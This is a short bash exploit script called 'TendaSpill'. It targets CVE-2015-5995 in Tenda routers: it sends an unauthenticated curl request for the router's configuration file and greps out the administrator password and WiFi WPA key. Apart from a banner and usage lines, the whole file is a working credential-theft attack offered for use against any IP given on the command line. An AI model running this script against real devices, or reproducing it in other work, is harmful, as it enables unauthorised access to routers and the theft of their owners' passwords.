#!/bin/bash
#
# "We're here to observe another kind of code. The bad code." - Root, Person of Interest
#

IP=$1
echo ""
echo ""
echo "#######                              #####                         
   #    ###### #    # #####    ##   #     # #####  # #      #      
   #    #      ##   # #    #  #  #  #       #    # # #      #      
   #    #####  # #  # #    # #    #  #####  #    # # #      #      
   #    #      #  # # #    # ######       # #####  # #      #      
   #    #      #   ## #    # #    # #     # #      # #      #      
   #    ###### #    # #####  #    #  #####  #      # ###### ######"
echo "--------------------------------------------"

echo "An exploitation tool to extract passwords using CVE-2015-5995."

echo "by Shahee Mirza ## Twitter: @shaheemirza"

echo "--------------------------------------------"

if [ -z "$IP" ]
then
echo "++++++++++++++++++++++++++++++++++++++++++++"
      echo "USES: ./tendaspill.sh IP:PORT"
      echo "E.G.: ./tendaspill.sh 192.168.1.1:8080"
echo "++++++++++++++++++++++++++++++++++++++++++++"
exit
fi

echo ""

echo "Exploiting: $IP"

echo ""

echo "++++++++++++++++++++++++++++++++++++++++++++"

echo "Administrative and WiFi Password:"

echo "++++++++++++++++++++++++++++++++++++++++++++"

echo ""
curl -s -k  -X $'GET' \
    -H $'Host: '$IP -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US;q=0.6,en;q=0.4' -H $'Referer: http://'$IP'/' -H $'User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1' -H $'Cookie: language=en; admin:language=en' -H $'Connection: close' \
    -b $'language=en; admin:language=en' \
    $'http://'$IP'/cgi-bin/DownloadCfg/RouterCfm.cfg' 2>&1 | grep 'http_passwd\|wl_wpa_psk'

echo ""

echo "--------------------------------------------"

echo ""

